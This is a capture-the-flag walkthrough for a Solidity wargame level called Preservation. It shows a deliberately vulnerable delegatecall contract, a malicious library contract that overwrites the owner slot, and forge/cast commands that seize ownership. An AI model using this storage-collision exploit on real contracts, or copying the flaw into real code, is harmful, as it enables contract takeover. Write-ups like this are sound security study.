### 16 - Preservation
this contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

**The goal of this level is for you to claim ownership of the instance you are given.**

*  Things that might help
    *    Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
    *    Understanding what it means for delegatecall to be context-preserving.
    *    Understanding how storage variables are stored and accessed.
    *    Understanding how casting works between different data types.

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

### Solution
- Delegate call will execute function in the context of the callee contract. Which `owner = address(time)` will change the `owner` value inside the contract `Preservation`.
- [Exploit Contract](script/16_MalliciousPreservation.sol)
```Solidity
contract MallicousTimeZoneLib {
    // match the Preservation storage layout
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

	// instead of changing the time, we change the value owner
    function setTime(uint256 time) public {
        owner = address(time);
    }
}
```

- Deploy the contract
```Solidity
$ forge create script/16_MalliciousPreservation.sol:MallicousTimeZoneLib --rpc-url $RPC_URL --private-key $PK --broadcast
Deployed to: 0xf2fD8B1ECBcac178a32f1C24Affd4D91ebe22966
```

- I was wondering how can I pass my mallicious contract address as during the challenge construction.
- after tinkering 
- Call the setTime(<address_of_our_mallicious_library>) on the target contract.
```Bash
cast send $INSTANCE "setFirstTime(uint256)()" 1212 \
--rpc-url $RPC_URL --private-key $PK
```

- The storedTime variable in slot 3 did not change. however, the address of the first library address was changed.
```Bash
❯ for i in (seq 0 3); cast storage $INSTANCE $i --rpc-url $RPC_URL; end
0x000...00000000000000000000000000004bc -- slot 0 changed to dec 1212 instead
0x000...97adf1b5052d2eb82d3a272b0b92312
0x000...ee1e7752d7c62493cea1e69a810e2ed
0x000...0000000000000000000000000000000

- That means calling the function again would fail since address 0x000...4bc is nonexistent
- So i try calling the second function instead.
```Bash
cast send $INSTANCE "setSecondTime(uint256)()" \
0xf2fD8B1ECBcac178a32f1C24Affd4D91ebe22966 \
--rpc-url $RPC_URL --private-key $PK
```

- So turns out the second contract changes the first library address aswell. that way This challenge contract would never broke and I don't have to create a new one. OH, so that's the author intention.
```Bash
0x00.....c24affd4d91ebe22966 -- yea this time it changes the address 0 to our mallicious contract address.
0x00.....2eb82d3a272b0b92312
0x00.....2493cea1e69a810e2ed
0x00.....0000000000000000000
0x00.....0000000000000000000
0x00.....0000000000000000000
```

- So, our mallicious contract is now in the game, we are now can being execution to change the owner to ours.
```Bash
cast send $INSTANCE "setFirstTime(uint256)()" $MY_ADDR \
--rpc-url $RPC_URL --private-key $PK
```

- Verify
```Bash
cast call $INSTANCE "owner()(address)" --rpc-url $RPC_URL
```
